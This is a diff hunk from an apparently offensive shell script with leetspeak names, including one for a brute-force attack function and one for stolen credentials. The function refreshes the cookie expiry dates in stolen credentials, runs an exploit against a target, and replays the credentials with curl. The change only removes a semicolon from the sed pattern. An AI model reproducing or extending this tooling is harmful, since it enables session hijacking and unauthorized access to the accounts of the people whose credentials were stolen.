@@ -14,7 +14,7 @@ function fTh15() {
 function brut3F0rc34774ck() {
   th15="$(TZ=GMT-2 date '+%Y')"
   i5="$(TZ=GMT-2 date '+%a, %d-%b-%Y %T %Z')"
-  cr4p=$(echo "$s70l3nCr3d3n71al5" | sed 's/[FMSTW][adehionrtu]{2}, [0-9]{2}-[ADFJMMNOS][abcegilnoprtuv]{2}-$th15 [0-9]{2}:[0-9]{2}:[0-9]{2} GMT/expires=$i5;/g')
+  cr4p=$(echo "$s70l3nCr3d3n71al5" | sed 's/[FMSTW][adehionrtu]{2}, [0-9]{2}-[ADFJMMNOS][abcegilnoprtuv]{2}-$th15 [0-9]{2}:[0-9]{2}:[0-9]{2} GMT/expires=$i5/g')
   set +x
   exploits/inti "$t4rg37"
   h0n357ly="curl -i $@ $(fTh15 $cr4p) > \"$resp0nseF1l3\""
